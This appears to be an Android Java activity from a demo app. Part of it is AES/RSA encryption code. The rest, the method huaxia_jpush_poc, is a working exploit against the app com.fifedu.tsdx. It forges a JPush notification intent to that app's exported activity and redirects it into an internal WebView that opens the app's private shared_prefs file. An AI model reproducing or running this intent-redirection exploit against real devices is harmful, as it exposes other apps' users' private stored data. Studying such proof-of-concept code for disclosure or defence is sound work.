package com.example.knowledge.security;


import android.content.ComponentName;
import android.content.Intent;
import android.view.View;
import android.widget.EditText;
import android.widget.TextView;

import com.example.knowledge.R;
import com.example.knowledge.activity.BaseActivity;
import com.example.knowledge.security.aes.AESEncryptUtil;
import com.example.knowledge.security.rsa.RSAEncryptUtil;

import org.json.JSONObject;

public class CryptoActivity extends BaseActivity implements View.OnClickListener {

    EditText encryptEt;

    TextView encryptTv;

    TextView decryptTv;

    private CryptoFactory cryptoFactory;
    private IEncrypt aesEncrypt = new AESEncryptUtil();
    private IEncrypt rsaEncrypt = new RSAEncryptUtil();

    @Override
    public int getLayoutId() {
        return R.layout.activity_decrypt;
    }

    @Override
    public void initView() {
        encryptEt = findViewById(R.id.et_encrypt);
        encryptTv = findViewById(R.id.tv_encrypt);
        decryptTv = findViewById(R.id.tv_decrypt);

        findViewById(R.id.btn_encrypt_aes).setOnClickListener(this);
        findViewById(R.id.btn_decrypt_aes).setOnClickListener(this);
        findViewById(R.id.btn_encrypt_rsa).setOnClickListener(this);
        findViewById(R.id.btn_decrypt_rsa).setOnClickListener(this);
        findViewById(R.id.tv_encrypt_md5).setOnClickListener(this);
        findViewById(R.id.tv_jpush_poc).setOnClickListener(this);

        mTitleTv.setText("Crypto");
    }

    @Override
    public void onClick(final View view) {

        final int id = view.getId();

        switch (id) {
            case R.id.btn_encrypt_aes:
                cryptoFactory.setStrategy(aesEncrypt);
                encryptText("AES_ALIAS");
                break;
            case R.id.btn_decrypt_aes:
                cryptoFactory.setStrategy(aesEncrypt);
                decryptText("AES_ALIAS");
                break;
            case R.id.btn_encrypt_rsa:
                cryptoFactory.setStrategy(rsaEncrypt);
                encryptText("RSA_ALIAS");
                break;
            case R.id.btn_decrypt_rsa:
                cryptoFactory.setStrategy(rsaEncrypt);
                decryptText("RSA_ALIAS");
                break;
            case R.id.tv_jpush_poc:
                huaxia_jpush_poc();

                break;
        }
    }


    private void encryptText(String alias) {
        final String encryptedText = cryptoFactory.getStrategy()
                .encryptText(alias, encryptEt.getText().toString());
        encryptTv.setText(encryptedText);
    }

    private void decryptText(String alias) {
        final String decryptedText = cryptoFactory.getDecryptText(alias, encryptTv.getText().toString());
        decryptTv.setText(decryptedText);
    }

    @Override
    public void initData() {
        cryptoFactory = new CryptoFactory();

    }

    fif_jpush pushEntity_jpush;

    public void huaxia_jpush_poc() {
        Intent jpush_hw = new
                Intent("cn.jpush.android.intent.JNotifyActivity");
        ComponentName componentName = new
                ComponentName("com.fifedu.tsdx", "cn.jpush.android.service.JNotifyActivity");
        jpush_hw.setComponent(componentName);
        jpush_hw.setAction("cn.jpush.android.intent.NOTIFICATION_OPENED");
        pushEntity_jpush = new fif_jpush();
        pushEntity_jpush.notificationType = 0;
        pushEntity_jpush.rom_type = 1;
        pushEntity_jpush.messageId = "";
        pushEntity_jpush.source = "ssp";
        Intent inner = new Intent();
        ComponentName inner_c = new ComponentName("com.fifedu.tsdx", "com.lib_common.activity.CommonWebViewActivity");
        inner.putExtra("url", "file:///data/data/com.fifedu.tsdx/shared_prefs/tsdx_share_data.xml");
        inner.setComponent(inner_c);
        pushEntity_jpush.deeplink = inner.toUri(Intent.URI_INTENT_SCHEME);
        pushEntity_jpush.targetPkgName = "com.fifedu.tsdx";
        pushEntity_jpush.originalMessage = huaxiapushfake();
        jpush_hw.putExtra("msg_data", pushEntity_jpush.c());

        startActivity(jpush_hw);
    }

    public JSONObject huaxiapushfake() {
        try {
            JSONObject jsonObject = new JSONObject();
            JSONObject n_intent = new JSONObject();
            JSONObject n_intent1 = new JSONObject();
            n_intent1.put("n_type", 0);
            n_intent1.put("n_url", pushEntity_jpush.deeplink);
            n_intent1.put("n_package_name", "com.fifedu.tsdx");
            jsonObject.put("m_content", n_intent);
            n_intent.put("n_intent", n_intent1);
            return jsonObject;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    public static class fif_jpush {

        public String deeplink;
        public String targetPkgName;
        public int notificationType;
        public int rom_type;
        public String messageId;
        public String source;
        public JSONObject originalMessage;

        public String c() {

            try {
                JSONObject jSONObject = new JSONObject();
                jSONObject.put("deeplink", this.deeplink);
                jSONObject.put("targetPkgName", this.targetPkgName);
                jSONObject.put("notificationType", this.notificationType);
                jSONObject.put("rom_type", this.rom_type);
                jSONObject.put("messageId", this.messageId);
                jSONObject.put("source", this.source);
                jSONObject.put("originalMessage", this.originalMessage);
                return jSONObject.toString();
            } catch (Throwable th) {
                return "";
            }
        }

    }

}